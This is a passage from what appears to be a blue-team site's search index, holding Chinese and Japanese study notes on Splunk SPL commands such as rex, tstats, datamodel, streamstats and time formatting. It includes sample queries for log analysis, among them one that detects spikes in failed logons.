MITRE_Label_order\n</code></pre>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#validate","title":"validate","text":"<p><code>case</code>\u7684\u53cd\u9762\uff0c\u4e0d\u5339\u914d\u7684\u8bdd\u8fd4\u56de\uff0c\u5339\u914d\u7b2c\u4e00\u4e2a\u6761\u4ef6\u5219\u7ee7\u7eed\u786e\u8ba4\u540e\u9762\u7684\u6761\u4ef6\u3002</p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#in","title":"in","text":"<p>[!NOTE] \u5fc5\u987b\u5728eval\u7684<code>if</code>\u6216<code>case</code>\u51fd\u6570\u4e2d\u4f7f\u7528</p> <p>\u5982\uff1a<code>...| eval error = if(in(status, \"404\", \"503\"), \"true\", \"false\")</code></p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#matchingtruefalseif","title":"\u5404\u79cdMatching\u529f\u80fd\uff0c\u8fd4\u56deTRUE/FALSE\uff08\u591a\u4e0eif\u8fde\u7528\uff09","text":"<ul> <li>searchmatch()</li> <li>cidrmatch()\uff1a\u5224\u65ad\u6307\u5b9a\u5b57\u6bb5\u662f\u5426\u5339\u914dCIDR\u3002     </li> <li>match()\uff1a\u6b63\u5219\u5339\u914d\u3002</li> </ul>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#replace","title":"replace","text":"<p><code>replace(&lt;literal string/field&gt;, &lt;regex pattern&gt;, &lt;subsititution&gt;)</code> \u4e0b\u4f8b\uff0c\u7528\\1\u6216\\2\u6765\u6355\u83b7/\u4f20\u9012regex\u4e2d\u7684\u5206\u7ec4\u4f7f\u5176\u4fdd\u6301\u539f\u6837\uff0c\u66ff\u6362\u6389\u4e2d\u95f4\u90e8\u5206\u3002     </p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#coalesce","title":"coalesce\uff1a\u5408\u5e76","text":"<p>\u5bf9\u6307\u5b9a\u7684\uff08\u591a\u4e2a\uff09\u5b57\u6bb5\u4e2d\uff0c\u8fd4\u56de\u7b2c\u4e00\u4e2a\u975enull\u503c\u3002\u7528\u4e8e\u591a\u79cdlog\uff08\u5982\u591a\u5bb6\u5382\u5546\u7b49\uff09\u5bf9\u540c\u4e00\u542b\u4e49\u7684\u6570\u636e\u6709\u4e0d\u540c\u5b57\u6bb5\u540d\u65f6\uff0c\u81ea\u5df1\u521b\u5efa\u4e00\u4e2a\u4e0a\u5c42\u5b57\u6bb5\u6765\u5438\u6536\u4ed6\u4eec\u7684\u5b57\u6bb5\u540d\u5dee\u5f02\u3002</p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#splunk","title":"splunk\u6b63\u5219","text":"<ul> <li>regex\uff1a\u5355\u7eaf\u4f5c\u4e3a\u8fc7\u6ee4\u5668\u3002\u4e14\u201c\u6700\u5c0f\u5339\u914d\uff1f\u201d\u2014\u2014\u6709pattern\u5b57\u7b26\u4e32\u7684\u4e00\u6bb5\u5c31\u7b97\u5339\u914d\u3010\u53ef\u80fd\u662f\u56e0\u4e3a\u6307\u5b9a\u4e86\u5b57\u6bb5\uff0c\u6240\u4ee5hit\u5c31\u53ef\u3011</li> <li>rex\uff1a\u6b63\u5219\u63d0\u53d6\u5b57\u6bb5\uff0c\u5339\u914d\u540e\u4fdd\u5b58\u5230\u67d0\u4e2a\u5b57\u6bb5</li> <li>erex\uff1a\u66f4\u7b80\u5355\uff0c\u7c7b\u4f3c\u81ea\u52a8\u63d0\u53d6\uff0c\u53ea\u9700\u7ed9\u4e00\u4e2a\u4f8b\u5b50</li> </ul> <p>\u6b63\u5219\u8868\u8fbe\u5f0f</p> <p>[!NOTE] Splunk regular expressions are PCRE (Perl Compatible Regular Expressions)</p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#urlfqdn","title":"URL\u63d0\u53d6FQDN","text":"<pre><code>index=proxy_a\n| rex field=url \"^(?:(?:https?|tcp)://)?(?&lt;FQDN&gt;[^:/?#]+)(?::\\d+)?\\b(?:/|$)\"\n| dedup FQDN\n| table FQDN\n</code></pre>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#_9","title":"\u5207\u7247\u65b9\u5f0f","text":"<pre><code>index=\"proxy_c\" \n| eval url1=split(url,\"/\")\n| eval url2=mvindex(url1,0)\n| eval url3=split(url2,\":\")\n| eval fqdn=mvindex(url3,0)\n| stats count by fqdn\n</code></pre>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#restconf","title":"rest\u2014\u2014conf\u786e\u8ba4","text":"<p>\u30aa\u30f3\u30d7\u30ec\u306e\u74b0\u5883\uff1a<code>/opt/splunk/etc/apps/TA-recordedfuture/local/recordedfuture_settings.conf</code> splunk cloud \u306e\u5834\u5408\u306f\u4ee5\u4e0b spl \u3088\u308a\u78ba\u8a8d\uff1a <pre><code>| localop\n| rest splunk_server=local /servicesNS/nobody/TA-recordedfuture/configs/conf-recordedfuture_settings/\n</code></pre></p> <p>\u5bf9\u6bd4URL\uff1a<code>https://&lt;tenant&gt;.splunkcloud.com/ja-JP/app/TA-recordedfuture/rfes_enrich_ip</code></p> <pre><code>| localop\n| rest splunk_server=local /services/TA-recordedfuture/enrich\n</code></pre>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#_10","title":"\u67e5\u770b\u6240\u6709\u5b57\u6bb5\u72b6\u51b5","text":"<p>\u4e2a\u6570\u3001\u552f\u4e00\u6570\u3001\u503c\u7b49\u3002</p> <pre><code>index=\u2026 \n| fieldsummary\n</code></pre>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#indexdatamodel","title":"\u67e5\u770bindex\u5c5e\u4e8e\u54ea\u4e2adatamodel","text":"<pre><code>| datamodel \n| rex field=_raw \"\\\"modelName\\\"\\s*\\:\\s*\\\"(?&lt;modelName&gt;[^\\\"]+)\\\"\" \n| fields modelName \n| table modelName \n| map maxsearches=40 search=\"tstats `summariesonly` count from datamodel=$modelName$ by sourcetype,index | eval modelName=\\\"$modelName$\\\"\"\n</code></pre>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#map","title":"map","text":"","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#datamodel","title":"datamodel","text":"<p>\u6267\u884c\u65e0\u53c2\u6570\u7684\u547d\u4ee4 <code>| datamodel</code>\uff1a\u663e\u793a\u6240\u6709datamodel\uff08json\u683c\u5f0f\uff09\u3002 \u5176\u4e2d\uff0cobjectNameList\u91cc\u7684\u5c31\u662fdataset\u2014\u2014\u5373dataset\u662fdatamodel\u7ec4\u6210\u90e8\u5206\u3002\u6bcf\u79cddataset\u53c8\u6709\u5bf9\u5e94\u7684tag\u6807\u8bc6\uff08\u53c2\u8003\u7406\u89e3\uff09</p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#3datasets","title":"3\u79cddatasets\uff1a","text":"<ul> <li>Events\uff1a\u4e0d\u5305\u542btransforming\u547d\u4ee4\u548cpipe\u7684\u641c\u7d22</li> <li>Searches\uff1a\u5305\u542bpipe\u5230transforming\u7684\u641c\u7d22</li> <li>Transactions\uff1a\u5305\u542btransaction\u547d\u4ee4\u7684\u641c\u7d22</li> </ul>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#gui","title":"GUI","text":"","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#_11","title":"\u6ce8\u610f\uff08\u6ca1\u61c2\uff09","text":"<ul> <li>\u524d\u63d0\uff1a\u6709event\u6216search dataset\u3002</li> <li>\u5e76\u4e0d\u4f1a\u4ece\u6c38\u4e45data model\u52a0\u901f\u4e2d\u83b7\u76ca</li> </ul>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#add-field","title":"Add Field","text":"<p>Auto-Extracted\uff1a\u53ea\u80fd\u5728root dataset\u4f7f\u7528</p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#pivot","title":"Pivot","text":"<p>\u5c31\u662fno-code\u53ef\u89c6\u5316\u3002</p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#_12","title":"\u547d\u4ee4","text":"<p><code>| datamodel [&lt;data_model_name&gt;] [&lt;dataset_name&gt;] [&lt;data_model_search_mode&gt;] [strict_fields=&lt;bool&gt;] [allow_old_summaries=&lt;bool&gt;] [summariesonly=&lt;bool&gt;]</code></p> <ul> <li> <p>data_model_search_mode\uff1a<code>search</code> | <code>flat</code> | <code>acceleration_search</code></p> <ul> <li><code>search</code>\uff1a\u663e\u793a\u6307\u5b9adatamodel/dataset\u7684\u6240\u6709event\u3002\u5e76\u4e14\u6bcf\u4e2a\u5b57\u6bb5\u5728\u4fa7\u8fb9\u680f\u4f1a\u663e\u793a\u6570\u636e\u7ed3\u6784\u7684\u4ece\u5c5e\u5173\u7cfb\u3002</li> <li><code>flat</code>\uff1a\u4e0esearch\u76f8\u53cd\uff0c\u4e0d\u4f1a\u663e\u793a\u5b57\u6bb5\u7684\u4ece\u5c5e\u5173\u7cfb\u3002</li> </ul> </li> <li> <p><code>summariesonly=t</code>\uff1a\u4ec5\u641c\u7d22\u4ee5TSIDX\u683c\u5f0f\u6c47\u603b\u7684\u6570\u636e\u2014\u2014\u5373\u4e0d\u641c\u7d22raw data</p> </li> <li>\u4e5f\u53ef\u4ee5\u8fd9\u6837\u641c\uff08\u7ed3\u6784\u5982\u4e0b\uff0cfrom\u65b9\u5f0f\u597d\u50cf\u4e3b\u8981\u7528\u4e8e\u76f8\u5173search\uff09\uff1a<code>| from datamodel Endpoint.Ports</code> </li> </ul>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#_13","title":"\u65f6\u95f4\u8303\u56f4\u6307\u5b9a","text":"<p>datamodel\u4e0d\u53ef\u7528earliest\u90a3\u79cd\uff0c\u9700\u8981 <code>where relative_time()</code></p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#relative_time","title":"relative_time","text":"<p>\u6ce8\u610f\u8fd4\u56de\u7684\u662fepoch time\u683c\u5f0f\u3002</p> <p>\u4ee5\u4e0b\u793a\u4f8b\u6307\u5b9a\u6700\u65e9\u65f6\u95f4\u4e3a 2 \u5c0f\u65f6\u524d\u5bf9\u9f50\u5c0f\u65f6\uff0c\u6700\u665a\u65f6\u95f4\u4e3a 1 \u5c0f\u65f6\u524d\u5bf9\u9f50\u5c0f\u65f6\uff1a <code>... | where _time&gt;relative_time(now(), \"-2h@h\") AND _time&lt;relative_time(now(), \"-1h@h\")</code></p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#tstat","title":"tstat","text":"<ul> <li>\u7528\u4e8e\u7edf\u8ba1Tsidx\u6587\u4ef6\u7684\u3002\u5982\u679cTsidx\u6587\u4ef6\u6ca1\u6709\u76ee\u6807\u5b57\u6bb5\uff0c\u641c\u7d22\u5219\u4e0d\u4f1a\u8fd4\u56de\u7ed3\u679c\u3002</li> <li>\u4f7f\u7528from\u4ece\u7279\u5b9adata model\u62c9\u53d6event\u3002</li> <li>\u4f7f\u7528where\u6765\u8fc7\u6ee4\u3002</li> <li>\u4f7f\u7528by\u6765\u5206\u7ec4\u3002</li> <li>\u662fGenerating\u547d\u4ee4\uff08\u9700\u8981\u524d\u5bfc\u7ba1\u9053\u7b26\uff09\u3002</li> <li>\u4f7f\u7528\u6ce8\u610f\uff1a\u6700\u597d\u5199\u4e0adataset\u7684\u5b8c\u6574\u8def\u5f84\uff08\u65e0\u8bbadatamodel\u8fd8\u662f\u5b57\u6bb5\uff09\u3002</li> </ul> <p>\u4f8b\uff1a <pre><code>... | tstats count where index=botsv2 by sourcetype\n\n\n... | `tstats` count from datamodel=Authentication.Authentication where * () by _time,Authentication.action span=10m \n| timechart minspan=10m useother=`useother` count by Authentication.action \n| `drop_dm_object_name(\"Authentication\")`\n</code></pre></p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#_14","title":"\u901a\u914d\u7b26","text":"<p>\u4ec5\u53ef\u5728where\u5b50\u53e5\u4e2d\u4f7f\u7528\u901a\u914d\u7b26\u641c\u7d22\u3002</p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#datamodeltstat","title":"datamodel\u8f6ctstat","text":"","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#stats_1","title":"stats\u53d8\u4f53","text":"","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#spl-memoeventstats-spl-memostreamstats","title":"SPL memo#eventstats\uff08\u8ffd\u52a0\u5217\u2014\u2014\u53cc\u91cd\u7edf\u8ba1\uff09 \u548c SPL memo#streamstats\uff08\u52a8\u6001\u7edf\u8ba1\uff09","text":"<ul> <li>\u4e24\u8005\u90fd\u662f\u7edf\u8ba1\u4e8b\u4ef6\u5e76\u7ed9\u6bcf\u4e2a\u4e8b\u4ef6\u653e\u5165\u4e00\u4e2a\u65b0\u5b57\u6bb5</li> <li>\u4e0d\u8fc7eventstats\u662f\u9759\u6001\uff0c\u800cstreamstats\u662f\u52a8\u6001\u2014\u2014\u5373streamstats\u52a0\u5165\u7684\u65b0\u5b57\u6bb5\u7684\u7edf\u8ba1\u503c\u4f1a\u6839\u636e\u7edf\u8ba1\u4e8b\u4ef6\u7684\u6570\u76ee\u800c\u53d8\u52a8/\u6ed1\u52a8</li> </ul> <p>https://www.bitsioinc.com/using-splunk-statistical-commands-eventstats-and-streamstats/#:~:text=Splunk%20streamstats%20command%20calculates%20a,requests%20as%20events%20are%20seen.</p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#memo","title":"memo&amp;\u4f8b\u5b50","text":"<pre><code>index=\"ad\" sourcetype=\"ALOG_ACCESS_AD\" action=\"LOGON-Failure\" \n| bin span=1h _time \n| stats count as fail_count by  user _time\n| streamstats current=f window=1 last(fail_count) as prev_fail_count by user\n| where fail_count &gt; prev_fail_count*70 OR (fail_count &gt; 20 AND prev_fail_count = 0)\n| eval _time=strftime(_time,\"%m-%d_%H:%M\")\n| sort _time\n</code></pre>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#splunkconf","title":"\u4ecesplunk\u7684conf\u770b\u5b57\u6bb5\u53d8\u6362","text":"","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#bin","title":"bin","text":"<p>\u5c06\u8fde\u7eed\u7684\u6570\u503c\u653e\u5165\u79bb\u6563\u7684\u96c6/\u5bb9\u5668\u4e2d\uff08timechart\u5185\u7f6e\u4e86span\u4e00\u6837\uff09</p> <p>\u5982\uff1a\u65f6\u95f4\uff08\u63091\u5c0f\u65f6\u95f4\u9694\u653e\u7f6e\u3002\u5373\u4e0d\u7ba1\u51e0\u5206\u51e0\u79d2\uff0c\u76f4\u63a5\u6309\u5c0f\u65f6\u7684\u6570\u5206\u914d\uff09</p> <ul> <li><code>| bin span=1h _time</code><ul> <li><code>span</code> \u548c <code>_time</code> \u53ef\u4ee5\u4e92\u6362\u4f4d\u7f6e</li> <li>\u8fd8\u53ef\u4ee5 as \u65b0\u5b57\u6bb5</li> </ul> </li> </ul> <p>\u4e0d\u662f\u53ea\u80fdbin\u65f6\u95f4\u5b57\u6bb5\uff01\uff01</p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#_15","title":"\u65f6\u95f4","text":"","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#_16","title":"\u8303\u56f4\u6307\u5b9a","text":"<p>\u683c\u5f0f\uff1a<code>%m/%d/%Y:%H:%M:%S</code></p> <ul> <li><code>earliest=01/31/2023:00:00:00 latest=04/30/2023:00:00:00</code></li> </ul> <p>[!NOTE] datamodel\u7528\u4e0d\u4e86\u8fd9\u79cd\u5f62\u5f0f</p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#_17","title":"\u683c\u5f0f\u5316","text":"","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#strftime","title":"<code>strftime</code>","text":"<p>\u5982\u679c\u81ea\u5df1\u60f3\u6307\u5b9a\u65f6\u95f4\uff0c\u6ce8\u610ftimestamp\u7684\u5355\u4f4d\u9700\u8981\u662f\u79d2\uff08\u5373timestamp\u9ed8\u8ba4\u4e3a\u6beb\u79d2\uff0c\u8981\u9664\u4ee51000\uff09\uff01</p> <ul> <li><code>| eval _time=strftime(_time,\"%m-%d_%H:%M\")</code></li> <li><code>| fieldformat _time=strftime(_time,\"%Y-%m-%dT%H:%M:%S.%l%z\")</code></li> <li><code>%T</code> \u5c31\u662f\uff1a<code>%H:%M:%S</code></li> <li><code>%F</code> \u5c31\u662f\uff1a<code>%Y-%m-%d</code> \uff08ISO8601\u683c\u5f0f\uff09</li> <li>\u6ce8\u610f\uff1a\u8ba1\u7b97\u5b57\u6bb5\u7684\u503c\u522b\u5fd8\u4e86\u7528\u5355\u5f15\u53f7\u62ec\u4f4f\uff01</li> </ul>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#strptimetime_field-the_time_format","title":"<code>strptime(&lt;time_field&gt;, &lt;the_time_format&gt;)</code>","text":"<p>\u662f\u5c06\u6307\u5b9a\u683c\u5f0f\u7684\u65f6\u95f4\u8f6c\u4e3a epoch time\u683c\u5f0f\u3002</p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#_18","title":"\u540c\u6bd4\u73af\u6bd4","text":"<pre><code>index IN(\"ad_g\") sourcetype=ALOG earliest=-0d@d latest=now | eval flag_date=\"Today\"\n| append [search index IN(\"ad_g\") sourcetype=ALOG earliest=-7d@d latest=-6d@d | eval flag_date=\"Last week\" | eval _time=_time+86400*7]\n| timechart span=1d count by flag_date\n</code></pre>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#timewrap-int-timescale","title":"<code>timewrap [&lt;int&gt;] &lt;timescale&gt;</code>","text":"<p>\u4e00\u822c\u8ddf\u968f\u5728 timechart \u7ed3\u679c\u540e\u3002</p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#mv","title":"mv\u76f8\u5173","text":"<p>\u5f88\u591a\u65f6\u5019mv\u51fd\u6570\u7684\u53c2\u6570\u90fd\u6709\u4e2a\u8868\u8fbe\u5f0f\u2014\u2014\u56e0\u4e3amv\u662flist\u6570\u636e\uff0c\u6240\u4ee5mv\u51fd\u6570\u7684\u610f\u56fe\u662f\u8fed\u4ee3\u5904\u7406\u3002</p> <ul> <li><code>\u2026| eval failure_user_count=mvcount(mvfilter(match(v_ua, \"-Failure\")))</code></li> <li><code>\u2026| eval v_normal_error_uni = mvdedup(mvmap(v_uat , replace(v_uat, \"WRITE_\", \"READ_\")))</code></li> </ul>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#_19","title":"\u5b57\u7b26\u4e32\u5904\u7406","text":"<p><code>tostring(field, \"commas\")</code></p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#bytes","title":"\u8ba1\u7b97\u5e26\u5bbd\uff08Bytes\uff09\u5355\u4f4d","text":"<p><pre><code>... \n| eval bytes = if(isnull(bytes), \"n/a\", bytes)\n| eval size = case(\n    bytes &gt;= pow(1024, 3), round(bytes / pow(1024, 3), 2) . \" GB\",\n    bytes &gt;= pow(1024, 2), round(bytes / pow(1024, 2), 2) . \" MB\",\n    bytes &gt;= 1024, round(bytes / 1024, 2) . \" KB\",\n    true(), bytes . \" B\"\n)\n</code></pre> * \u7b2c\u4e00\u884c\u7684eval\uff0c\u56e0\u4e3a\uff1a\u6ce8\u610f\u8e29\u5751</p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/Splunk%E7%9F%A5%E8%AF%86%E7%82%B9/","title":"Splunk\u77e5\u8bc6\u70b9","text":"","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/Splunk%E7%9F%A5%E8%AF%86%E7%82%B9/#search-time-operations-sequence","title":"Search time operations sequence","text":"<ol> <li>Field Extractions</li> <li>Field Aliases</li> <li>Calculated Fields</li> <li>Lookups</li> <li>Event Types</li> <li>Tags</li> </ol> <p>[!NOTE] \u6240\u4ee5\u524d\u8005\u65e0\u6cd5\u53c2\u7167\u540e\u8005</p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/Splunk%E7%9F%A5%E8%AF%86%E7%82%B9/#_1","title":"\u5404\u79cd\u9650\u5236","text":"<p>https://docs.splunk.com/Documentation/Splunk/9.1.0/Admin/Limitsconf</p> <p>[!NOTE] \u5c11\u7528sort\uff0c\u5230\u4e0a\u9650\u7684\u8bdd\u4f1a\u7edf\u8ba1\u5230\u4e00\u534a\u5c31\u4e0d\u7edf\u8ba1\u4e86\uff01\uff01</p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/Splunk%E7%9F%A5%E8%AF%86%E7%82%B9/#term","title":"\u7d22\u5f15\u50a8\u5b58\u7684\u903b\u8f91\u2014\u2014\u5206\u7247\uff08TERM\u7406\u89e3\uff09","text":"<ul> <li> <p>\u9996\u5148\u77e5\u9053\u6709\u4e3b/\u6b21\u5206\u9694\u7b26\u3002\u4e0b\u9762\u5217\u4e3e\u4e00\u90e8\u5206\u5e38\u89c1\u7684</p> <ul> <li>\u4e3b\u5206\u9694\u7b26\uff1a\u7a7a\u683c\u3001\u5404\u79cd\u62ec\u53f7\u3001\u5206\u53f7\u3001\u9017\u53f7\u3001\u5f15\u53f7\u3001\u767e\u5206\u53f7\uff08\u6709\u5751\uff09\u3001tab\u3001\u53f9\u53f7</li> <li>\u6b21\u5206\u9694\u7b26\uff1a\u82f1\u6587\u53e5\u53f7\u3001\u6b63\u659c\u6760\u3001\u5192\u53f7\u3001\u7b49\u53f7\u3001\u4e95\u53f7\u3001\u4e0b\u5212\u7ebf\u3001\u77ed\u6a2a\u7ebf\u3001\u7f8e\u5143\u7b26\u3001\u767e\u5206\u53f7\uff08\u6709\u5751\uff09</li> </ul> </li> <li> <p>\u50a8\u5b58\u903b\u8f91\uff08TSIDX\u6587\u4ef6\uff09\uff1asplunk\u4f1a\u6309\u4e3b\u3001\u6b21\u5206\u9694\u7b26\u7684\u987a\u5e8f\u6765\u5207\u5272\u6bcf\u4e2aevent\u7684\u5404\u4e2aterm\u4fdd\u5b58\u5230index\u3002\u5982\u201cip=127.0.0.1\u201d\uff0c\u9996\u5148\u5df2\u88ab\u4e3b\u5206\u9694\u7b26\u5207\u5272\uff0c\u7136\u540e\u4f1a\u6309\u6b21\u5206\u9694\u7b26\u88ab\u5207\u5272\u6210\u201cip\u201d\u3001\u201c127\u201d\u3001\u201c0\u201d\u3001\u201c1\u201d\u3001\u201cip=127.0.0.1\u201d</p> <ul> <li>\u5176\u5bfc\u81f4\u7684\u7ed3\u679c\uff1a\u5982\u679c\u641c\u7d22127.0.0.1\uff0csplunk\u4f1a\u8fd9\u6837\u641c\u7d22\uff1a<code>127 AND 0 AND 1</code>\uff08\u5b9e\u9645\u4e0a\u4f3c\u4e4e\u662f\u7528Lispy Expression\uff09\uff0c\u5176\u8fd4\u56de\u4e8b\u4ef6\u4e2d\u4efb\u4f55\u4f4d\u7f6e\u5305\u542b\u8fd9\u4e9b\u6570\u5b57\u7684\u4e8b\u4ef6\u3002</li> <li>\u800c\u641c\u7d22<code>TERM(127.0.0.1)</code>\u4e5f\u4f1a\u65e0\u7ed3\u679c\uff0c\u56e0\u4e3a\u6309\u7167index\u50a8\u5b58\u903b\u8f91\uff0c\u5e76\u6ca1\u6709\"127.0.0.1\"\u8fd9\u4e00\u9879\uff08\u56e0\u4e3a\u4e0d\u662f\u88ab\u4e3b\u5206\u9694\u7b26\u5212\u5206\uff09</li> </ul> </li> <li>\u6240\u4ee5\u641c\u7d22\u88ab\u6b21\u5206\u9694\u7b26\u5212\u5206\u592a\u591a\u7684\u9879\u76ee\u53ef\u7528TERM\u547d\u4ee4\u76f4\u63a5\u641c\u88ab\u4fdd\u5b58\u7684\u4e00\u6574\u4e2aterm\uff08\u4e0a\u8ff0\u7684\u201cip=127.0.0.1\u201d\uff09\u5373\u53ef\u7701\u7565\u4e0d\u5fc5\u8981\u7684\u641c\u7d22\u3002</li> <li>\u53e6\u5916\uff1a\u5982\u679c\u53ef\u7528<code>\u5b57\u6bb5=TERM(\u503c)</code>\u7684\u641c\u7d22\u65f6\uff0c\u5b57\u6bb5\u4e0d\u80fd\u7528\u522b\u540d\u3002\u6240\u4ee5\u4ee3\u66ff\u65b9\u6cd5\uff1a<code>TERM(\u503c) \u5b57\u6bb5\u522b\u540d=\u503c</code>\u3002</li> </ul> <p>[!NOTE] TERM\u5ffd\u7565\u6b21\u8981\u5206\u9694\u7b26 \u5373\u6839\u636e\u4e3b\u8981\u5206\u9694\u7b26\u5212\u5206\uff0c\u5c06<code>TERM()</code>\u4f5c\u4e3a\u5355\u4e2aterm\u8fdb\u884c\u68c0\u7d22</p> <p>About event segmentation Lispy Expression: to build a bloom filter and check against TSIDX files.</p> <p>[!NOTE] \u641c\u7d22\u77ed\u8bed\u4f3c\u4e4e\u4e5f\u4f1a\u8e29\u5751 \u5982\u641c\u7d22<code>index=security \"failed password\"</code>\uff0c\u7531\u4e8eLispy Expression\u89e3\u6790\u4e3a\uff1a<code>[ AND failed index::security password ]</code>\uff0c\u4f3c\u4e4e\u4f1a\u8fd4\u56de\u5305\u542bfailed\u548cpassword\u7684event\u800c\u4e0d\u662f\"failed password\"\u987a\u5e8f\u7684\u3002</p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/Splunk%E7%9F%A5%E8%AF%86%E7%82%B9/#search-optimization","title":"Search Optimization","text":"","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/Splunk%E7%9F%A5%E8%AF%86%E7%82%B9/#search-scheduler","title":"Search Scheduler\uff08\u8c03\u5ea6\uff09","text":"<p>\u540c\u65f6\u641c\u7d22\u6570\u6709\u4e0a\u9650\uff0c\u6240\u4ee5\u6709\u4f18\u5148\u5ea6\uff1a</p> <ol> <li>Ad-hoc\uff1a\u5373\u624b\u52a8\u641c\u7d22</li> <li>realtime\u8ba1\u5212\uff1a\u7528\u6237\u4fdd\u5b58\u7684\u3002\u53ef\u4ee5\u8df3\u8fc7\u7684</li> <li>continue\u8ba1\u5212\uff1a\u7528\u6237\u4fdd\u5b58\u7684\u3002\u4e0d\u53ef\u8df3\u8fc7\uff0c\u53ef\u4ee5\u6682\u65f6\u505c\u6b62</li> <li>\u81ea\u52a8\u641c\u7d22\u8ba1\u5212</li> </ol>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/Splunk%E7%9F%A5%E8%AF%86%E7%82%B9/#search-acceleration","title":"Search Acceleration","text":"<p>\u7528Data Summary\u3002</p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/Splunk%E7%9F%A5%E8%AF%86%E7%82%B9/#3","title":"\u52a0\u901f\u76843\u79cd\u547d\u4ee4\u7c7b\u578b","text":"<ul> <li>Streaming\uff1a\u5728indexer\u4e0a\u8fd0\u884c\uff0c\u6d41\u5f0f\u5904\u7406\u6bcf\u6761event\u3002\u5982eval\u3002<ul> <li>Distributable Streaming\uff1aevent\u7684\u987a\u5e8f\u4e0d\u91cd\u8981\uff0c\u4e00\u822c\u5728indexer\u4e0a\u8fd0\u884c\u3002\u4f46\u662f\u5982\u679c\u5728\u5176\u4e4b\u524d\u6709\u9700\u8981\u5728search head\u4e0a\u8fd0\u884c\u7684\u547d\u4ee4\uff0c\u90a3\u4e48\u5176\u4f59\u7684\u547d\u4ee4\u4e5f\u5fc5\u987b\u5728search head\u4e0a\u8fd0\u884c\uff08\u5373\u4e00\u65e6\u641c\u7d22\u5904\u7406\u79fb\u81f3search head\uff0c\u5219\u65e0\u6cd5\u8fd4\u56deindexer\uff09\u3002\u5982\uff1aeval\u3001fields\u3001regex\u3002</li> <li>Centralized Streaming\uff08Stateful Streaming\uff09\uff1aevent\u7684\u987a\u5e8f\u5f88\u91cd\u8981\u3002\u4ec5\u5728search 